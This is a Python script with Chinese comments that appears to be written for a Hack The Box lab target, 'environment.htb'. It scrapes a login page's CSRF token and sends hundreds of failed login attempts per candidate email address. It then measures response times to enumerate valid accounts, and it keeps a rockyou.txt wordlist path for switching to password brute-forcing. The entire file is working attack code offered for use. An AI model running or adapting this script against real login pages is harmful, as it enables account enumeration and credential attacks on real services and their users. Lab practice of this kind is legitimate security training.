import requests
from bs4 import BeautifulSoup # 需要 pip install beautifulsoup4
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import re # 用于从 JS 中提取 token (如果需要)
import os
import time # 导入 time 模块

# --- 配置 ---
LOGIN_PAGE_URL = "http://environment.htb/login" # 或者 /index.php/login/
POST_URL = "http://environment.htb/login" # 确认 POST 到哪个 URL
# EMAIL_TO_TEST = "environment.htb@gmail.com" # 这个不再是主要配置
WORDLIST_PATH = os.path.join(os.path.dirname(__file__), "rockyou.txt") # 仍然保留，以防需要切换回爆破
MAX_WORKERS = 1 # 进一步降低线程数，以减少时间测量干扰
NUM_ATTEMPTS_PER_EMAIL = 200 # 每个邮箱尝试的次数
FIXED_PASSWORDS_TO_TRY = [" दिसिसअफिक्टेस्टपैस्वर्ड123! "] # 使用一个极不可能正确的固定密码
# ---

found_event = threading.Event() # 这个事件在当前模式下可能不会被触发
session = requests.Session()

def get_csrf_token(login_page_url):
    try:
        response = session.get(login_page_url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        token_input = soup.find('input', {'name': '_token'})
        if token_input and token_input.get('value'):
            return token_input['value']
        
        meta_token = soup.find('meta', {'name': 'csrf-token'})
        if meta_token and meta_token.get('content'):
            return meta_token['content']

        print("CSRF token not found in HTML inputs or meta tags.")
        return None
    except requests.RequestException as e:
        print(f"Error fetching CSRF token: {e}")
        return None

def try_login_attempt(args):
    email, password, csrf_token, attempt_num = args
    if found_event.is_set(): # 在此模式下，我们不期望找到密码
        return

    password = password.strip()
    
    if not csrf_token:
        print(f"Skipping attempt {attempt_num} for {email} with password {password} due to missing CSRF token.")
        return None # 返回 None 以便后续处理

    payload = {
        "_token": csrf_token,
        "email": email,
        "password": password,
        "remember": "False",
    }
    
    start_time = time.time()
    try:
        response = session.post(POST_URL, data=payload, timeout=10, allow_redirects=False)
        end_time = time.time()
        duration = end_time - start_time

        # 为了分析，即使登录失败也打印详细信息
        print(f"Attempt #{attempt_num} - Email: {email} - Pwd: '{password}' - Status: {response.status_code} - Time: {duration:.4f}s - Location: {response.headers.get('Location')}")
        
        # 在时间测试模式下，我们不主要关心是否爆破成功，而是关心时间
        # 但保留成功逻辑以防万一，尽管使用固定错误密码时不太可能触发
        if response.status_code in [301, 302, 303, 307, 308] and response.headers.get('Location'):
            if "/dashboard" in response.headers.get('Location').lower() or \
               "home" in response.headers.get('Location').lower() or \
               LOGIN_PAGE_URL not in response.headers.get('Location'):
                print(f"--- UNEXPECTED SUCCESS (check fixed password or logic) ---")
                print(f"Email: {email}")
                print(f"Password: {password}")
                found_event.set() # 标记事件，尽管不太可能
        return duration # 返回响应时间

    except requests.RequestException as e:
        end_time = time.time()
        duration = end_time - start_time # 即使异常也记录时间
        print(f"Error - Attempt #{attempt_num} - Email: {email} - Pwd: '{password}' - Time: {duration:.4f}s: {e}")
        return None # 返回 None

def main():
    emails_to_try = [
        "admin@environment.htb",
        "marketing@environment.htb",
        "asdfqwerzxcv@environment.htb", # 一个你认为是无效的用户名作为基准
        "user@environment.htb",
        "dev@environment.htb"
    ]

    print("Attempting to get initial CSRF token...")
    initial_csrf_token = get_csrf_token(LOGIN_PAGE_URL)
    if not initial_csrf_token:
        print("Could not get initial CSRF token. Aborting.")
        return
    print(f"Using initial CSRF token: {initial_csrf_token}")

    tasks = []
    for email in emails_to_try:
        for password in FIXED_PASSWORDS_TO_TRY: # 使用固定的错误密码列表
            for i in range(1, NUM_ATTEMPTS_PER_EMAIL + 1):
                tasks.append((email, password, initial_csrf_token, i))

    print(f"Starting time-based user enumeration for {len(emails_to_try)} email(s).")
    print(f"Each email will be tried {NUM_ATTEMPTS_PER_EMAIL} times with {len(FIXED_PASSWORDS_TO_TRY)} fixed password(s).")
    
    results_by_email = {email: [] for email in emails_to_try} # 存储每个邮箱的响应时间

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # executor.map(try_login_attempt, tasks) # map 不会返回结果，我们需要结果来分析
        future_to_task = {executor.submit(try_login_attempt, task): task for task in tasks}
        for future in as_completed(future_to_task):
            task_args = future_to_task[future]
            email_for_task = task_args[0]
            try:
                duration = future.result()
                if duration is not None:
                    results_by_email[email_for_task].append(duration)
            except Exception as exc:
                print(f'Task for {email_for_task} generated an exception: {exc}')

    print("\n--- Time-based Enumeration Results ---")
    for email, durations in results_by_email.items():
        if durations:
            avg_duration = sum(durations) / len(durations)
            min_duration = min(durations)
            max_duration = max(durations)
            print(f"Email: {email} - Attempts: {len(durations)}")
            print(f"  Avg Time: {avg_duration:.4f}s, Min Time: {min_duration:.4f}s, Max Time: {max_duration:.4f}s")
        else:
            print(f"Email: {email} - No successful attempts recorded.")
           
    if found_event.is_set(): # 再次检查，以防万一
        print("Warning: 'found_event' was set, check for unexpected successful login.")

if __name__ == "__main__":
    main()
    